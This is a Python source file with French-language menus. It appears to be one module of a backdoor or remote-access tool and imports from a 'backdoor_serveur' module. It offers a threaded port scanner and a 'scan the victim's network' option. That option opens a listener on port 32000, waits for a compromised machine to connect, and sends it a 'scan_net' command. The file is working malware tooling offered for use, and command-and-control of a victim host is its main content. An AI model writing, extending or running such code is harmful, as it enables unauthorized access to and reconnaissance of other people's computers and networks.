import subprocess
import socket
import threading
import concurrent.futures
import platform
from backdoor_serveur import socket_send_command_and_receive_all_data

def scan_network():
    print()
    print("""
    1) Scannez un réseaux
    2) Scannez le réseaux de la victime""")
    a = input("Votre choix : ")
    if a == "1":
        scan_reseaux()
    elif a == "2":
        scan_victime()
    else:
        print("ERREUR: vous devez entrez un nombre entre 1 et 2")


def init_scanner(ip, port):
    print_lock = threading.Lock()
    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    scanner.settimeout(1)
    try:
        scanner.connect((ip, port))
        scanner.close()
        with print_lock:
            print(f"[{port}]" + "Opened")
    except:
        pass

def scan_reseaux():
    print()
    ip = input("Entrez votre ip ou nom de domaine : ")
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(1000):
            executor.submit(init_scanner, ip, port + 1)
    print("""
    1) Rescannez une ip
    2) Exit
    """)
    print()
    terminer_scan = input("Votre choix : ")
    if terminer_scan == "1":
        scan_network()
    else:
        pass


def scan_victime():
    HOST_IP = ""
    HOST_PORT = 32000

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST_IP, HOST_PORT))
    s.listen()

    print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
    connection_socket, client_address = s.accept()
    print(f"Connexion établie avec {client_address}")

    ip_net = socket_send_command_and_receive_all_data(connection_socket, "scan_net")
    print(ip_net.decode())
